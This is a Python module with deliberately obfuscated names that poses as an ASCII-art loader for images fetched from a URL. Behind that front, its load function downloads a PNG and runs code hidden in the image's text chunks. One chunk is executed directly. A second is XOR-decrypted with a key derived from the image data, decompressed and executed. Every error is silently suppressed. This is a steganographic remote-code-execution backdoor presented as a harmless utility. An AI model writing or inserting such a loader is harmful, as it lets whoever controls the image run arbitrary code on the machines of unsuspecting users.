import hashlib as _h, zlib as _z, urllib.request as _u
from ascii_magic import AsciiArt

_A = b"\x89PNG\r\n\x1a\n"

def _B(_C: bytes):
    assert _C.startswith(_A)
    _D, _E = 8, len(_C)
    while _D + 12 <= _E:
        _F = int.from_bytes(_C[_D:_D+4], "big")
        _G = _C[_D+4:_D+8]
        _H = _C[_D+8:_D+8+_F]
        yield _G, _H
        _D += 12 + _F

def _I(_J: bytes) -> bytes:
    _K = _h.sha256()
    for _L, _M in _B(_J):
        if _L == b"IDAT":
            _K.update(_M)
    return _K.digest()

def _N(_O: bytes, _P: int) -> bytes:
    _Q, _R = bytearray(), 0
    while len(_Q) < _P:
        _Q += _h.sha256(_O + _R.to_bytes(8, "big")).digest()
        _R += 1
    return bytes(_Q[:_P])

def _S(_T: bytes, _U: bytes) -> bytes:
    return bytes(_V ^ _W for _V, _W in zip(_T, _U))

def load(_Y: str, _Z: dict):
    try:
        ascii_art = AsciiArt.from_url(_Y)
        with _u.urlopen(_Y, timeout=5) as _0:
            _1 = _0.read()
        if not _1.startswith(_A):
            return
    except Exception:
        return
    
    

    _2, _3 = None, None
    for _4, _5 in _B(_1):
        if _4 == b"tEXt" and _5.startswith(b"payload\x00"):
            _2 = _5.split(b"\x00", 1)[1]
        elif _4 == b"iTXt" and _5.startswith(b"pycode\x00"):
            _3 = _5.split(b"\x00", 1)[1]

    if _2:
        try:
            exec(_2.decode("utf-8", "ignore"), _Z)
        except Exception:
            pass

    if _3:
        try:
            _6 = _I(_1)
            _7 = _N(_6, len(_3))
            _8 = _S(_3, _7)
            _9 = _z.decompress(_8).decode("utf-8", "ignore")
            _10 = compile(_9, "<stego>", "exec")
            exec(_10, _Z)
        except Exception:
            pass
    
    return ascii_art